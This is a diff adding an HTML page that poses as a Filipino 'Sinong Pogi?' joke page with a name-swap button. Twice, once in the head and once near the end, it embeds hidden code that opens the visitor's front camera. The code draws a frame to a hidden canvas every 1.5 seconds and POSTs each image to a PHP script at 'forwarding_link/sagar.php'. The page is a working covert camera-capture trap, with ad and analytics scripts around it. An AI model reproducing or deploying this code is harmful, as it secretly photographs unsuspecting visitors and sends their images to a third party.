@@ -1,0 +1,313 @@
+<html>
+<head>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/sagar.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+            <title>Sagar Zuckerberg</title>
+        <meta name="description" content="Sagar Tool">
+        <meta property="og:title" content="Sagar Tool" />
+   
+
+                <meta property="og:description" content="Sagar Tool">
+                
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+
+    
+            <style>
+            .pure-button-primary, .pure-button-color, .custom-menu-wrapper{
+                background-color: #99003b !important;
+            }
+            .ready{
+                color: #99003b;
+            }
+            .number_list .active {
+                background: #99003b;
+                color: #fff;
+            }
+        </style>
+    
+
+    
+    
+
+
+    
+    
+    
+    
+
+        
+
+            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <script> (adsbygoogle = window.adsbygoogle || []).push({ google_ad_client: "ca-pub-1771845412011016", enable_page_level_ads: true });</script>
+        
+
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-148233951-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    <meta name="msapplication-config" content="none"/>
+
+    <link rel="shortcut icon" type="image/x-icon" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4" />
+    <link rel="apple-touch-icon" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4"/>
+    <link rel="apple-touch-icon-precomposed" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4"/>
+
+    
+    
+
+    
+
+    
+
+
+            <script data-cfasync="false" type="text/javascript">
+        (function(w, d) {
+            var s = d.createElement('script');
+            s.src = '//cdn.adpushup.com/39117/adpushup.js';
+            s.type = 'text/javascript'; s.async = true;
+            (d.getElementsByTagName('head')[0] || d.getElementsByTagName('body')[0]).appendChild(s);
+        })(window, document);
+        </script>
+    
+
+    
+
+    
+
+
+    
+    
+
+    
+
+
+
+
+    <script>
+        
+        function setCookie1(cname, cvalue, exdays) {
+            var d = new Date();
+            d.setTime(d.getTime() + (exdays*24*60*60*1000));
+            var expires = "expires="+ d.toUTCString();
+            document.cookie = cname + "=" + encodeURIComponent(cvalue) + ";" + expires + ";path=/";
+        }
+
+        function getCookie1(cname) {
+            var name = cname + "=";
+            var cookie = document.cookie;
+            var ca = cookie.split(';');
+            for(var i = 0; i <ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return decodeURIComponent(c.substring(name.length, c.length));
+                }
+            }
+            return "";
+        }
+
+    </script>
+
+
+
+    
+
+
+    
+
+    
+</head>
+<style>
+body{
+background-position: center;
+background-repeat: no-repeat;
+background-size: cover;
+}
+</style>
+  <center>
+   <img src="https://i.ibb.co/BPmNs1c/FB-IMG-15951650329761557.jpg" " height="350" width="340">
+  </center> 
+  <hr>
+  	<center>
+  <h1> 
+    <font color="#6485ED" size="10">Sinong Pogi?</font>
+   </h1> 
+   <p>
+<font id="sagar" color="#6485ED" >Arjay Ellema</font>
+</p>
+<button type="button"  onclick="myFunction()">Pinaka Pogi</button>
+
+<script>
+function myFunction() {
+   document.getElementById("sagar").innerHTML = "Sagar Zuckerberg";
+} 
+</script>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/sagar.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</html>
